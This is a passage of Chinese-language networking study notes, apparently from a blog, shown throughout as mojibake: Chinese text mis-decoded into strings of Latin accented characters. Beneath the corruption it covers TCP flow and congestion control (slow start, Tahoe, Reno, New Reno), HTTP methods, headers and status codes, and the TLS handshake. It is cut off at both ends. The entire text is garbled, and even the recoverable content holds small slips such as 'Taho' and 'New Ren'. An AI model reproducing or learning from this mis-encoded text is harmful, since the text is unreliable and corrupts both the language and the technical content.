ä¸­ï¼Œä¸¤ç«¯å…¶å®žéƒ½ç»´æŠ¤è€…çª—å£ï¼Œåˆ†åˆ«ä¸ºå‘é€ç«¯çª—å£å’ŒæŽ¥æ”¶ç«¯çª—å£ å‘é€ç«¯çª—å£åŒ…å«å·²ç»å‘é€ä½†æœªæ”¶åˆ°åº”ç­”çš„æ•°æ®å’Œå¯ä»¥å‘é€ä½†æ˜¯æœªå‘é€çš„æ•°æ® å‘é€ç«¯çª—å£æ˜¯ç”±æŽ¥æ”¶ç«¯çª—å£å‰©ä½™å¤§å°å†³å®šçš„ã€‚æŽ¥æ”¶æ–¹ä¼šæŠŠå½“å‰æŽ¥æ”¶çª—å£çš„å‰©ä½™å¤§å°å†™å…¥åº”ç­”æŠ¥æ–‡ï¼Œå‘é€ç«¯æ”¶åˆ°åº”ç­”åŽæ ¹æ®è¯¥å€¼å’Œå½“å‰ç½‘ç»œæ‹¥å¡žæƒ…å†µè®¾ç½®å‘é€çª—å£çš„å¤§å°ï¼Œæ‰€ä»¥å‘é€çª—å£çš„å¤§å°æ˜¯ä¸æ–­å˜åŒ–çš„ã€‚ å½“å‘é€ç«¯æŽ¥æ”¶åˆ°åº”ç­”æŠ¥æ–‡åŽï¼Œä¼šéšç€çª—å£è¿›å…¥æ»‘åŠ¨ã€‚ æ»‘åŠ¨çª—å£æ˜¯ä¸€ä¸ªå¾ˆé‡è¦æ¦‚å¿µï¼Œå®ƒå¸®åŠ©äº† TCP å®žçŽ°äº†æµé‡æŽ§åˆ¶çš„åŠŸèƒ½ã€‚æŽ¥æ”¶æ–¹é€šè¿‡æŠ¥æ–‡å‘ŠçŸ¥å‘é€æ–¹è¿˜å¯ä»¥å‘é€å¤šå°‘æ•°æ®ï¼Œä»Žè€Œä¿è¯äº†æŽ¥æ”¶æ–¹èƒ½å¤Ÿæ¥å¾—åŠæŽ¥æ”¶æ•°æ®ï¼Œé˜²æ­¢å‡ºçŽ°æŽ¥æ”¶æ–¹å¸¦å®½å·²æ»¡ï¼Œä½†æ˜¯å‘é€æ–¹è¿˜æ˜¯ä¸€ç›´å‘é€æ•°æ®çš„æƒ…å†µã€‚ zero çª—å£åœ¨å‘é€æŠ¥æ–‡çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šé‡åˆ°å¯¹ç«¯å‡ºçŽ°é›¶çª—å£çš„æƒ…å†µï¼Œåœ¨è¯¥æƒ…å†µä¸‹ï¼Œå‘é€ç«¯ä¼šåœæ­¢å‘é€æ•°æ®ï¼Œå¹¶å¯åŠ¨ persistent timer.è¯¥å®šæ—¶å™¨ä¼šå®šæ—¶å‘é€è¯·æ±‚ç»™å¯¹ç«¯ï¼Œè®©å¯¹ç«¯å‘ŠçŸ¥çª—å£å¤§å°ã€‚åœ¨é‡è¯•æ¬¡æ•°è¶…è¿‡ä¸€å®šæ¬¡æ•°åŽï¼Œå¯èƒ½ä¼šä¸­æ–­ TCP é“¾æŽ¥ã€‚ æ‹¥å¡žå¤„ç†æ‹¥å¡žå¤„ç†å’Œæµé‡æŽ§åˆ¶ä¸åŒï¼ŒåŽè€…æ˜¯ä½œç”¨äºŽæŽ¥æ”¶æ–¹ï¼Œä¿è¯æŽ¥æ”¶æ–¹æ¥å¾—åŠæŽ¥æ”¶æ•°æ®ï¼Œè€ŒåŽè€…æ˜¯ä½œç”¨äºŽç½‘ç»œï¼Œé˜²æ­¢è¿‡å¤šçš„æ•°æ®æ‹¥å¡žç½‘ç»œï¼Œé¿å…å‡ºçŽ°ç½‘ç»œè´Ÿè½½è¿‡å¤§çš„æƒ…å†µã€‚ æ‹¥å¡žå¤„ç†åŒ…æ‹¬äº†å››ä¸ªç®—æ³•ï¼Œåˆ†åˆ«æ˜¯ï¼šæ…¢å¼€å§‹ï¼Œæ‹¥å¡žé¿å…ï¼Œå¿«é€Ÿé‡ä¼ ï¼Œå¿«é€’æ¢å¤ æ…¢å¼€å§‹ç®—æ³•æ…¢å¼€å§‹ç®—æ³•ï¼Œå°±æ˜¯åœ¨ä¼ è¾“å¼€å§‹æ—¶å°†å‘é€çª—å£æ…¢æ…¢æŒ‡æ•°ç­‰çº§æ‰©å¤§ï¼Œä»Žè€Œé¿å…ä¸€å¼€å§‹å°±ä¼ è¾“æœ€å¤§é‡æ•°æ®å¯¼è‡´ç½‘ç»œé˜»å¡žã€‚ æ…¢å¼€å§‹ç®—æ³•æ­¥éª¤å…·ä½“å¦‚ä¸‹ï¼š è¿žæŽ¥åˆå§‹è®¾ç½®æ‹¥å¡žçª—å£ï¼ˆCongestion Windowï¼‰ä¸º 1 MSS(ä¸€ä¸ªåˆ†æ®µçš„æœ€å¤§æ•°æ®é‡) æ¯è¿‡ä¸€ä¸ª RTT å°†çª—å£å¤§å°ä¹˜äºŒ æŒ‡æ•°çº§å¢žåŠ è‚¯å®šä¸èƒ½æ²¡æœ‰é™åˆ¶çš„ï¼Œæ‰€ä»¥æœ‰ä¸€ä¸ªé˜ˆå€¼é™åˆ¶ï¼Œå½“çª—å£å¤§äºŽé˜ˆå€¼å°±ä¼šå¯åŠ¨æ‹¥å¡žé¿å…ç®—æ³• æ‹¥å¡žé¿å…ç®—æ³•æ‹¥å¡žé¿å…ç®—æ³•ç›¸æ¯”ç®€å•ç‚¹ï¼Œæ¯è¿‡ä¸€ä¸ª RTT çª—å£å¤§å°åªåŠ ä¸€ï¼Œè¿™æ ·å°±èƒ½é¿å…æŒ‡æ•°çº§å¢žé•¿å¯¼è‡´ç½‘ç»œæ‹¥å¡žï¼Œæ…¢æ…¢å°†å¤§å°è°ƒæ•´åˆ°æœ€ä½³å€¼ åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å¯èƒ½å®šæ—¶å™¨è¶…æ—¶çš„æƒ…å†µï¼Œè¿™æ—¶å€™ TCP ä¼šè®¤ä¸ºç½‘ç»œæ‹¥å¡žï¼Œä¼šé©¬ä¸Šè¿›è¡Œä¸€ä¸‹æ­¥éª¤ï¼š å°†é˜ˆå€¼è®¾å®šä¸ºå½“å‰æ‹¥å¡žçª—å£çš„ä¸€åŠ å°†æ‹¥å¡žçª—å£è®¾å®šä¸º 1MSS å¯åŠ¨æ‹¥å¡žé¿å…ç®—æ³• å¿«é€Ÿé‡ä¼ å¿«é€Ÿé‡ä¼ ä¸€èˆ¬å’Œå¿«æ¢å¤ä¸€èµ·å‡ºçŽ°ã€‚ä¸€æ—¦æŽ¥æ”¶ç«¯æ”¶åˆ°çš„æŠ¥æ–‡å‡ºçŽ°å¤±åºçš„æƒ…å†µï¼ŒæŽ¥æ”¶ç«¯åªä¼šå›žå¤æœ€åŽä¸€ä¸ªé¡ºåºæ­£ç¡®çš„æŠ¥æ–‡åºå·ã€‚å¦‚æžœå‘é€ç«¯æ”¶åˆ°ä¸‰ä¸ªé‡å¤çš„ ACK ,æ— éœ€ç­‰å¾…å®šæ—¶å™¨è¶…æ—¶è€Œæ˜¯å¯åŠ¨å¿«é€Ÿé‡ä¼ ç®—æ³•ã€‚å…·ä½“æ˜¯ï¼šTCP Taho çš„å®žçŽ°ï¼š å°†é˜ˆå€¼è®¾ä¸ºå½“å‰é˜ˆå€¼çš„ä¸€èˆ¬ å°†æ‹¥å¡žçª—å£è®¾ä¸º 1MSS é‡æ–°å¼€å§‹æ…¢å¼€å§‹ç®—æ³• TCP Reno å®žçŽ°ï¼š æ‹¥å¡žçª—å£å‡åŠ å°†é˜ˆå€¼è®¾å®šä¸ºå½“å‰æ‹¥å¡žçª—å£ è¿›å…¥å—æ¢å¤é˜¶æ®µï¼ˆé‡å‘å¯¹ç«¯éœ€è¦çš„åŒ…ï¼Œä¸€æ—¦æŽ¥æ”¶åˆ°ä¸€ä¸ªæ–°çš„ ACK ç­”å¤å°±é€€å‡ºè¯¥é˜¶æ®µï¼‰ï¼Œè¿™ç§æ–¹åœ¨ä¸¢å¤±å¤šä¸ªåŒ…çš„æƒ…å†µä¸‹å°±ä¸é‚£ä¹ˆå‹å¥½äº† ä½¿ç”¨æ‹¥å¡žé¿å…ç®—æ³• TCP New Ren æ”¹è¿›åŽçš„å¿«æ¢å¤TCP New Reno ç®—æ³•æ”¹è¿›äº†ä¹‹å‰ TCP Reno ç®—æ³•çš„ç¼ºé™·ã€‚åœ¨ä¹‹å‰ï¼Œå¿«æ¢å¤ä¸­åªè¦æ”¶åˆ°ä¸€ä¸ªæ–°çš„ ACK åŒ…ï¼Œå°±ä¼šé€€å‡ºå¿«æ¢å¤ã€‚ åœ¨ TCP New Reno ä¸­ï¼ŒTCP å‘é€æ–¹å…ˆè®°ä¸‹ä¸‰ä¸ªé‡å¤ ACK çš„åˆ†æ®µçš„æœ€å¤§åºå·ã€‚ å‡å¦‚æˆ‘æœ‰ä¸€ä¸ªåˆ†æ®µæ•°æ®æ˜¯ 1 ~ 10 è¿™åä¸ªåºå·çš„æŠ¥æ–‡ï¼Œå…¶ä¸­ä¸¢å¤±äº†åºå·ä¸º 3 å’Œ 7 çš„æŠ¥æ–‡ï¼Œé‚£ä¹ˆè¯¥åˆ†æ®µçš„æœ€å¤§åºå·å°±æ˜¯ 10ã€‚å‘é€ç«¯åªä¼šæ”¶åˆ° ACK åºå·ä¸º 3 çš„åº”ç­”ã€‚è¿™æ—¶å€™é‡å‘åºå·ä¸º 3 çš„æŠ¥æ–‡ï¼ŒæŽ¥æ”¶æ–¹é¡ºåˆ©æŽ¥æ”¶çš„è¯å°±ä¼šå‘é€ ACK åºå·ä¸º 7 çš„åº”ç­”ã€‚è¿™æ—¶å€™ TCP çŸ¥é“å¯¹ç«¯æ˜¯æœ‰å¤šä¸ªåŒ…æœªæ”¶åˆ°ï¼Œä¼šç»§ç»­å‘é€åºå·ä¸º 7 çš„æŠ¥æ–‡ï¼ŒæŽ¥æ”¶æ–¹é¡ºåˆ©æŽ¥æ”¶å¹¶ä¼šå‘é€ ACK åºå·ä¸º 11 çš„åº”ç­”ï¼Œè¿™æ—¶å‘é€ç«¯è®¤ä¸ºè¿™ä¸ªåˆ†æ®µæŽ¥æ”¶ç«¯å·²ç»é¡ºåˆ©æŽ¥æ”¶ï¼ŒæŽ¥ä¸‹æ¥ä¼šé€€å‡ºå¿«æ¢å¤é˜¶æ®µã€‚ å°ç»“ TCPå»ºç«‹è¿žæŽ¥éœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œæ–­å¼€è¿žæŽ¥éœ€è¦å››æ¬¡æ¡æ‰‹ æ»‘åŠ¨çª—å£è§£å†³äº†æ•°æ®çš„ä¸¢åŒ…ã€é¡ºåºä¸å¯¹å’Œæµé‡æŽ§åˆ¶çš„é—®é¢˜ æ‹¥å¡žçª—å£å®žçŽ°äº†å¯¹æµé‡çš„æŽ§åˆ¶ï¼Œä¿è¯å…¨å¤©å€™çŽ¯å¢ƒä¸‹æœ€ä¼˜çš„ä¼ é€’æ•°æ® HTTP ä»¥åŠ TLSHTTP è¯·æ±‚çš„å†…å®¹HTTP è¯·æ±‚ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š è¯·æ±‚è¡Œ é¦–éƒ¨ å®žä½“ è¯·æ±‚è¡ŒåŸºæœ¬ç”±è¯·æ±‚æ–¹æ³•ã€URLã€ç‰ˆæœ¬åè®®ç»„æˆã€‚ è¯·æ±‚æ–¹æ³•åˆ†å¾ˆå¤šç§ï¼ŒPOST,GET,HEAD,OPTION,ç­‰ç­‰ï¼Œæ›´å¤šå…·ä½“çš„ç‚¹å‡»è¿™é‡Œ å‰¯ä½œç”¨å’Œå¹‚ç­‰å‰¯ä½œç”¨æ˜¯æŒ‡å¯¹æœåŠ¡å™¨ä¸Šçš„èµ„æºåšæ”¹å˜ï¼Œæœç´ æ˜¯æ— å‰¯ä½œç”¨çš„ï¼Œæ³¨å†Œæ˜¯å‰¯ä½œç”¨çš„ã€‚ å¹‚ç­‰æŒ‡å‘é€ M å’Œ N æ¬¡è¯·æ±‚ï¼ˆä¸¤è€…ä¸åŒä¸”å¤§äºŽ1ï¼‰ï¼ŒæœåŠ¡å™¨ä¸Šèµ„æºçš„çŠ¶æ€ä¸€è‡´ï¼Œæ¯”å¦‚æ³¨å†Œ10ä¸ªå’Œ11ä¸ªè´¦å·æ˜¯ä¸å¹‚ç­‰çš„ï¼Œå¯¹æ–‡ç« è¿›è¡Œæ›´æ”¹10æ¬¡å’Œ11æ¬¡æ˜¯å¹‚ç­‰çš„ã€‚å› ä¸ºå‰è€…å¤šäº†ä¸€ä¸ªè´¦å·ï¼ˆèµ„æºï¼‰ï¼ŒåŽè€…åªæ˜¯æ›´æ–°åŒä¸€ä¸ªèµ„æº åœ¨è§„èŒƒçš„åº”ç”¨åœºæ™¯æ¥è¯´ï¼ŒGet å¤šç”¨äºŽæ— å‰¯ä½œç”¨çš„ï¼Œå¹‚ç­‰çš„åœºæ™¯ï¼Œä¾‹å¦‚æœç´¢å…³é”®å­—ã€‚Post å¤šç”¨äºŽå‰¯ä½œç”¨çš„ï¼Œä¸å¹‚ç­‰çš„åœºæ™¯ï¼Œä¾‹å¦‚æ³¨å†Œ æŠ€æœ¯ä¸Šæ¥è¯´ï¼š Get è¯·æ±‚èƒ½ç¼“å­˜ï¼ŒPost ä¸èƒ½ Post ç›¸å¯¹ Get å®‰å…¨ä¸€ç‚¹ï¼Œå› ä¸ºGET è¯·æ±‚éƒ½åŒ…å«åœ¨ URL é‡Œé¢ï¼Œä¸”ä¼šè¢«æµè§ˆå™¨ä¿å­˜åŽ†å²è®°å½•ã€‚è€Œ Post ä¸ä¼šï¼Œä½†æ˜¯åœ¨æŠ“åŒ…çš„æƒ…å†µä¸‹æ˜¯ä¸€æ ·çš„ã€‚ URL æœ‰é•¿åº¦é™åˆ¶ï¼Œä¼šå½±å“ GET è¯·æ±‚ï¼Œä½†æ˜¯è¿™ä¸ªé•¿åº¦é™åˆ¶æ˜¯æµè§ˆå™¨é™åˆ¶çš„ï¼Œä¸æ˜¯ RFC è§„å®šçš„ Post æ”¯æŒæ›´å¤šçš„ç¼–ç å¹¶ä¸”ä¸å¯¹æ•°æ®ç±»åž‹é™åˆ¶ é¦–éƒ¨é¦–éƒ¨åˆ†æˆè¯·æ±‚é¦–éƒ¨å’Œå“åº”é¦–éƒ¨ï¼Œå¹¶ä¸”éƒ¨åˆ†é¦–éƒ¨ä¸¤ç§é€šç”¨ã€‚ä¸‹é¢æ˜¯å¸¸è§çš„é¦–éƒ¨ é€šç”¨é¦–éƒ¨ é€šç”¨å­—æ®µ ä½œç”¨ Cache-Control æŽ§åˆ¶ç¼“å­˜çš„è¡Œä¸º Connection æµè§ˆå™¨æƒ³è¦ä¼˜å…ˆä½¿ç”¨çš„è¿žæŽ¥ç±»åž‹ï¼Œæ¯”å¦‚ keep-alive Date åˆ›å»ºæŠ¥æ–‡çš„æ—¶é—´ Pragma æŠ¥æ–‡æŒ‡ä»¤ Via ä»£ç†æœåŠ¡å™¨ç›¸å…³ä¿¡æ¯ Transfer-Encoding åˆ¶å®šæŠ¥æ–‡ä¸»ä½“çš„ä¼ è¾“ç¼–ç æ–¹å¼ Upgrade è¦æ±‚å®¢æˆ·ç«¯å‡çº§åè®® Warning åœ¨å†…å®¹ä¸­å¯èƒ½å­˜åœ¨é”™è¯¯ å…·ä½“è§£é‡Šçš„å¯ä»¥ç‚¹å‡»è¿™é‡Œ è¯·æ±‚é¦–éƒ¨ è¯·æ±‚é¦–éƒ¨ ä½œç”¨ Accept èƒ½æ­£ç¡®æŽ¥æ”¶çš„åª’ä½“ç±»åž‹ Accept-Charset èƒ½æ­£ç¡®æŽ¥æ”¶çš„å­—ç¬¦é›† Accept-Encoding èƒ½æ­£ç¡®æŽ¥æ”¶çš„ç¼–ç æ ¼å¼åˆ—è¡¨ Accept-Language èƒ½æ­£ç¡®æŽ¥æ”¶çš„è¯­è¨€åˆ—è¡¨ Expect æœŸå¾…æœåŠ¡ç«¯çš„æŒ‡å®šè¡Œä¸º From è¯·æ±‚æ–¹é‚®ç®±åœ°å€ Host æœåŠ¡å™¨çš„åŸŸå If-Match ä¸¤ç«¯èµ„æºæ ‡è®°æ¯”è¾ƒ If-Modified-Since æœ¬åœ°èµ„æºæœªä¿®æ”¹è¿”å›ž 304ï¼ˆæ¯”è¾ƒæ—¶é—´ï¼‰ If-None-Match æœ¬åœ°èµ„æºæœªä¿®æ”¹è¿”å›ž 304ï¼ˆæ¯”è¾ƒæ ‡è®°ï¼‰ User-Agent å®¢æˆ·ç«¯ä¿¡æ¯ Max-Forwards é™åˆ¶å¯è¢«ä»£ç†ä»¥åŠç½‘å…³è½¬å‘çš„æ¬¡æ•° Proxy-Authorization å‘ä»£ç†æœåŠ¡å™¨å‘é€éªŒè¯ä¿¡æ¯ Range è¯·æ±‚æŸä¸ªå†…å®¹çš„ä¸€éƒ¨åˆ† Referer è¡¨ç¤ºæµè§ˆå™¨æ‰€è®¿é—®çš„å‰ä¸€ä¸ªé¡µé¢ TE ä¼ è¾“ç¼–ç æ–¹å¼ å“åº”é¦–éƒ¨ å“åº”å¤´éƒ¨ ä½œç”¨ Accept-Ranges æ˜¯å¦æ”¯æŒæŸäº›ç§ç±»çš„èŒƒå›´ Age èµ„æºåœ¨ä»£ç†ç¼“å­˜ä¸­å­˜åœ¨çš„æ—¶é—´ ETag èµ„æºæ ‡è¯† Location å®¢æˆ·ç«¯é‡å®šå‘åˆ°æŸä¸ª URL Proxy-Authenticate æƒ³ä»£ç†æœåŠ¡å™¨å‘é€éªŒè¯ä¿¡æ¯ Server æœåŠ¡å™¨åå­— WWW-Authenticate èŽ·å–èµ„æºéœ€è¦çš„éªŒè¯ä¿¡æ¯ å®žä½“é¦–éƒ¨ å®žä½“é¦–éƒ¨ ä½œç”¨ Allow èµ„æºçš„æ­£ç¡®è¯·æ±‚æ–¹å¼ Content-Encoding å†…å®¹ç¼–ç çš„æ ¼å¼ Content-Language å†…å®¹ä½¿ç”¨çš„è¯­è¨€ Content-Length request body é•¿åº¦ Content-Location è¿”å›žæ•°æ®çš„å¤‡ç”¨åœ°å€ Content-MD5 Base64 åŠ å¯†æ ¼å¼çš„å†…å®¹ MD5 æ ¡éªŒå€¼ Content-Range å†…å®¹çš„ä½ç½®èŒƒå›´ Content-Type å†…å®¹çš„åª’ä½“ç±»åž‹ Expires å†…å®¹çš„è¿‡æœŸæ—¶é—´ Last_modified å†…å®¹çš„æœ€åŽä¿®æ”¹æ—¶é—´ å¸¸è§çš„çŠ¶æ€ç çŠ¶æ€ç çš„è´£ä»»æ˜¯å½“å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€è¯·æ±‚æ—¶ï¼Œæè¿°è¿”å›žçš„è¯·æ±‚ç»“æžœã€‚å€ŸåŠ©çŠ¶æ€ç ï¼Œç”¨æˆ·å¯ä»¥çŸ¥é“æœåŠ¡å•æ˜¯æ­£å¸¸å¤„ç†äº†è¯·æ±‚ï¼Œè¿˜æ˜¯å‡ºçŽ°äº†é”™è¯¯ã€‚ çŠ¶æ€ç çš„ç±»åˆ« ç±»åˆ« åŽŸå› çŸ­è¯­ 1XX Informationï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰ æŽ¥å—çš„è¯·æ±‚æ­£åœ¨å¤„ç† 2XX Successï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰ è¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯• 3XX Redirectionï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰ éœ€è¦è¿›è¡Œé™„åŠ æ“ä½œä»¥å®Œæˆè¯·æ±‚ 4XX Client Errorï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰ æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ 5XX Server Errorï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰ æœåŠ¡å™¨å¤„ç†è¯·æ±‚å‡ºé”™ 2XX æˆåŠŸ 200 OK,è¡¨ç¤ºä»Žå®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚åœ¨æœåŠ¡ç«¯è¢«æ­£ç¡®å¤„ç† 204ï¼ŒNo contentï¼Œè¡¨ç¤ºè¯·æ±‚æˆåŠŸï¼Œä½†å“åº”æŠ¥æ–‡ä¸å«å®žä½“çš„ä¸»ä½“éƒ¨åˆ† 205ï¼ŒReset Contentï¼Œè¡¨ç¤ºè¯·æ±‚æˆåŠŸï¼Œä½†å“åº”æŠ¥æ–‡ä¸å«å®žä½“çš„ä¸»ä½“éƒ¨åˆ†ï¼Œä¸Ž204å“åº”ä¸åŒçš„æ˜¯è¦æ±‚è¯·æ±‚æ–¹é‡ç½®å†…å®¹ 206 Partial Contentï¼Œè¡¨ç¤ºå¯¹å®¢æˆ·ç«¯è¿›è¡Œäº†èŒƒå›´è¯·æ±‚ï¼Œè€ŒæœåŠ¡å™¨æˆåŠŸæ‰§è¡Œäº†è¿™éƒ¨åˆ†çš„ GET è¯·æ±‚ï¼Œå“åº”æŠ¥æ–‡ä¸­ç”± Content-Range æŒ‡å®šèŒƒå›´çš„å®žä½“å†…å®¹ 3XX é‡å®šå‘ 301 moved permanently,æ°¸ä¹…æ€§é‡å®šå‘ï¼Œè¡¨ç¤ºèµ„æºå·²è¢«åˆ†é…åˆ°äº†æ–°çš„ URL 302 found,ä¸´æ—¶é‡å®šå‘ï¼Œè¡¨ç¤ºèµ„æºä¸´æ—¶è¢«åˆ†é…äº†æ–°çš„ URL 303 see otherï¼Œè¡¨ç¤ºèµ„æºå­˜åœ¨ç€å¦ä¸€ä¸ª URLåº”ä½¿ç”¨ GET æ–¹æ³•èŽ·å–èµ„æº 304 not modifiedï¼Œè¡¨ç¤ºæœåŠ¡å™¨å…è®¸è®¿é—®èµ„æºï¼Œä½†å› å‘ç”Ÿè¯·æ±‚æœªæ»¡è¶³æ¡ä»¶çš„æƒ…å†µ 307 temporary redirectï¼Œä¸´æ—¶é‡å®šå‘ï¼Œå’Œ302å«ä¹‰ç±»ä¼¼ï¼Œä½†æ˜¯æœŸæœ›å®¢æˆ·ç«¯ä¿æŒè¯·æ±‚æ–¹æ³•ä¸å˜å‘æ–°çš„åœ°å€å‘å‡ºè¯·æ±‚ã€‚ 4XX å®¢æˆ·ç«¯é”™è¯¯ 400 bad requestï¼Œè¯·æ±‚æŠ¥æ–‡å­˜åœ¨è¯­æ³•é”™è¯¯ 401 unauthorizedï¼Œè¡¨ç¤ºå‘é€çš„è¯·æ±‚éœ€è¦æœ‰é€šè¿‡ HTTP è®¤è¯çš„è®¤è¯æ¶ˆæ¯ 403 fobiddenï¼Œè¡¨ç¤ºå¯¹è¯·æ±‚èµ„æºçš„è®¿é—®è¢«æœåŠ¡å™¨æ‹’ç» 404 no found,è¡¨ç¤ºåœ¨æœåŠ¡å™¨ä¸Šæ²¡æœ‰æ‰¾åˆ°è¯·æ±‚çš„èµ„æº 5XX æœåŠ¡å™¨é”™è¯¯ 500 internal server error,è¡¨ç¤ºæœåŠ¡å™¨ç«¯åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿäº†é”™è¯¯ 501 Not Implemented,è¡¨ç¤ºæœåŠ¡å™¨ä¸æ”¯æŒå½“æœŸè¯·æ±‚æ‰€éœ€è¦çš„æŸä¸ªåŠŸèƒ½ 503 service unavaliable,è¡¨ç¤ºæœåŠ¡å™¨æš‚æ—¶å¤„äºŽè¶…è´Ÿè½½æˆ–è€…åœæœºæœåŠ¡ï¼Œæ— æ³•å¤„ç†è¯·æ±‚ TLSHTTPS é€šè¿‡ HTTP æ¥ä¼ è¾“ä¿¡æ¯ï¼Œä½†æ˜¯ä¿¡æ¯é€šè¿‡ TLS åè®®è¿›è¡Œäº† åŠ å¯† TLS åè®®ä½äºŽä¼ è¾“å±‚ä¹‹ä¸Šï¼Œåº”ç”¨å±‚ä¹‹ä¸‹ã€‚é¦–å…ˆè¿›è¡Œ TLS åè®®ä¼ è¾“éœ€è¦ä¸¤ä¸ª RTT,å¯ä»¥é€šè¿‡ Session Resumption å‡å°‘åˆ°ä¸€ä¸ª RTT åœ¨ TLS ä¸­ä½¿ç”¨äº†ä¸¤ç§åŠ å¯†æŠ€æœ¯ï¼Œåˆ†åˆ«ä¸ºï¼šå¯¹ç§°åŠ å¯†å’Œéžå¯¹ç§°åŠ å¯†ã€‚ å¯¹ç§°åŠ å¯†å¯¹ç§°åŠ å¯†å°±æ˜¯ä¸¤è¾¹éƒ½æ‹¥æœ‰ç›¸åŒçš„å¯†é’¥ï¼Œä¸¤è¾¹éƒ½çŸ¥é“è¯æ€Žä¹ˆå°†å¯†æ–‡åŠ å¯†è§£å¯† è¿™ç§åŠ å¯†æ–¹å¼ç¼ºç‚¹åœ¨äºŽå› ä¸ºä¼ è¾“æ•°æ®èµ°çš„éƒ½æ˜¯ç½‘ç»œï¼Œå¦‚æžœå¯†é’¥è¢«æˆªèŽ·é‚£å°±æ²¡æœ‰åŠ å¯†çš„æ„ä¹‰äº† éžå¯¹ç§°æœºå¯†æœ‰å…¬é’¥ç§é’¥ä¹‹åˆ†ï¼Œå…¬é’¥æ‰€æœ‰äººéƒ½å¯ä»¥çŸ¥é“ï¼Œå¦‚æžœå°†æ•°æ®ç”¨å…¬é’¥åŠ å¯†ï¼Œä½†æ˜¯å°†æ•°æ®è§£å¯†å¿…é¡»ä½¿ç”¨ç§é’¥è§£å¯†ï¼Œç§é’¥åªæœ‰åˆ†å‘å…¬é’¥çš„ä¸€æ–¹æ‰çŸ¥é“ã€‚ è¿™ç§åŠ å¯†æ–¹å¼å°±å¯ä»¥å®Œç¾Žè§£å†³å¯¹ç§°åŠ å¯†å­˜åœ¨çš„é—®é¢˜ï¼Œå‡è®¾ä¸¤ç«¯éƒ½éœ€è¦ä½¿ç”¨å¯¹ç§°åŠ å¯†ï¼Œé‚£ä¹ˆåœ¨è¿™ä¹‹å‰ï¼Œå¯ä»¥å…ˆä½¿ç”¨éžå¯¹ç§°åŠ å¯†äº¤æ¢å¯†é’¥ã€‚ ç®€å•æµç¨‹åŒ–å¦‚ä¸‹ï¼šæœåŠ¡ç«¯å°†å…¬é’¥å‘å¸ƒå‡ºåŽ»ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯ä¹ŸçŸ¥é“å…¬é’¥ï¼Œå°±ä¸‹æ¥å®¢æˆ·ç«¯åˆ›å»ºäº†ä¸€ä¸ªå¯†é’¥ï¼Œç„¶åŽé€šè¿‡å…¬é’¥åŠ å¯†åŽå‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æŽ¥æ”¶åˆ°ç§é’¥è§£å¯†å‡ºæ­£ç¡®çš„å¯†é’¥ï¼Œè¿™æ—¶å€™ä¸¤ç«¯å°±éƒ½çŸ¥é“å¯†é’¥æ˜¯ä»€ä¹ˆäº†ã€‚ TLS æ¡æ‰‹è¿‡ç¨‹å¦‚ä¸‹å›¾ï¼š å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªéšæœºå€¼ä»¥åŠéœ€è¦çš„åè®®å’ŒåŠ å¯†æ–¹å¼ æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„éšæœºå€¼ï¼Œè‡ªå·±ä¹Ÿäº§ç”Ÿäº†ä¸€ä¸ªéšæœºå€¼ï¼Œå¹¶æ ¹æ®å®¢æˆ·ç«¯çš„éœ€æ±‚çš„åè®®å’ŒåŠ å¯†æ–¹å¼æ¥ä½¿ç”¨å¯¹åº”çš„æ–¹å¼ï¼Œå¹¶ä¸”å‘é€è‡ªå·±çš„è¯ä¹¦ï¼ˆå¦‚æžœéœ€è¦éªŒè¯å®¢æˆ·ç«¯è¯ä¹¦éœ€è¦è¯´æ˜Žï¼‰ å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯çš„è¯ä¹¦éªŒè¯æ˜¯å¦æœ‰æ•ˆï¼ŒéªŒè¯é€šè¿‡ä¼šç”Ÿæˆä¸€ä¸ªéšæœºå€¼ï¼Œé€šè¿‡æœåŠ¡ç«¯è¯ä¹¦çš„å…¬é’¥åŠ å¯†è¿™ä¸ªéšæœºå€¼å¹¶å‘é€ç»™æœåŠ¡ç«¯ï¼Œå¦‚æžœæœåŠ¡ç«¯éœ€è¦éªŒè¯å®¢æˆ·ç«¯è¯ä¹¦çš„è¯ä¼šé™„å¸¦è¯ä¹¦ æœåŠ¡ç«¯æ”¶åˆ°åŠ å¯†è¿‡çš„éšæœºå€¼å¹¶ä½¿ç”¨ç§é’¥è§£å¯†èŽ·å¾—ä¸‰ä¸ªéšæœºå€¼ï¼Œè¿™æ—¶å€™ä¸¤ç«¯éƒ½æœ‰ä¸‰ä¸ªéšæœºå€¼ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸‰ä¸ªéšæœºå€¼æŒ‰ç…§ä¹‹å‰çš„çº¦å®šçš„åŠ å¯†æ–¹å¼ç”Ÿæˆå¯†é’¥ï¼ŒæŽ¥ä¸‹æ¥çš„é€šä¿¡æ—¢å¯ä»¥ä½¿ç”¨è¯¥å¯†é’¥åŠ å¯†è§£å¯†äº†ã€‚ é€šè¿‡ä¸Šé¢æ­¥éª¤ï¼Œå¯ä»¥çŸ¥é“ TLS æ¡æ‰‹é˜¶æ®µï¼Œä¸¤ç«¯ä½¿ç”¨éžå¯¹ç§°åŠ å¯†çš„æ–¹å¼è¿›è¡Œé€šä¿¡ï¼Œä½†æ˜¯å› ä¸ºéžå¯¹ç§°åŠ å¯†æŸè€—çš„æ€§èƒ½æ¯”å¯¹ç§°åŠ å¯†å¤§ï¼Œæ‰€ä»¥åœ¨æ­£å¼ä¼ 